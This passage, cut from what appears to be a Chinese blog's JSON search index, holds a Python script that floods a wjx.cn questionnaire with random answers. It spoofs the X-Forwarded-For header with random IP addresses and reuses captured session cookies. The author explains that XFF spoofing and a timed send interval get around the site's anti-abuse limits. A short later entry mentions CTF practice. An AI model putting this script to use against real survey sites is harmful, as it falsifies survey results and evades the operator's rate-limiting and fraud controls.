&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0&apos;, &apos;Accept&apos;: &apos;* / *&apos;, &apos;Accept - Language&apos;:&apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;, &apos;Accept - Encoding&apos;: &apos;gzip, deflate&apos;, &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;, &apos;Referer&apos;: &apos;https://www.wjx.cn/jq/43819938.aspx&apos;, &apos;Content-Length&apos;: &apos;32&apos;, &apos;x-forwarded-for&apos;:str(randint(1,255))+&apos;,&apos;+str(randint(1,255))+&apos;,&apos;+str(randint(1,255))+&apos;,&apos;+str(randint(1,255)), &apos;Cookie&apos;: &apos;acw_tc=2f624a2a15651667032113449e5a5a78c559be33a29f05393240f389ae1f26; .ASPXANONYMOUS=xwlWYYyD1QEkAAAANGQyY2UwY2QtNmMwMi00YzdjLTkyNjgtYjAwOTJjYzJlZWJhKVHVbWcXUrju0Qwec7aNRZwVtj81; jac43819938=36417905; UM_distinctid=16c6b348da41e1-011e2866b35c748-4c312272-144000-16c6b348da529f; CNZZDATA4478442=cnzz_eid%3D1762370884-1565166375-%26ntime%3D1565166375; Hm_lvt_21be24c80829bd7a683b2c536fcf520b=1565166702; Hm_lpvt_21be24c80829bd7a683b2c536fcf520b=1565166729; jpckey=%u5B66%u5386; LastActivityJoin=43819938,103045812444&apos;, &apos;Connection&apos;: &apos;close&apos; &#125; print(&apos;Using ip:&apos;+header[&apos;x-forwarded-for&apos;]) #submitdata = &quot;1$%s&#125;2$%s&#125;3$%s&quot; % (str(randint(1, 2)), str(randint(1, 4)), str(randint(1, 4))) # data = &#123; # &apos;submitdata&apos;:submitdata # &#125; data = &quot;submitdata=1%24&quot;+str(randint(1,2))+&quot;%7D2%24&quot;+str(randint(1,4))+&quot;%7D3%24&quot;+str(randint(1,4)) print data r = requests.post(url,headers=header,data=data) print r.headers print r.content time.sleep(40) headers从bp抓的包复制即可 绕过方法：使用xff、设置脚本发包的时间间隔 目前脚本很大概率会出现国外ip，可以搜集国内ip 参考链接：https://mochazz.github.io/","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://yoursite.com/tags/爬虫/"}]},{"title":"Start","slug":"start","date":"2019-07-18T03:48:34.000Z","updated":"2019-07-18T11:16:12.822Z","comments":true,"path":"2019/07/18/start/","link":"","permalink":"http://yoursite.com/2019/07/18/start/","excerpt":"","text":"Skr 这次天buuctf做到自闭，看换个博客能不能换个心情:)","categories":[],"tags":[{"name":"start","slug":"start","permalink":"http://yoursite.com/tags/start/"}]}]}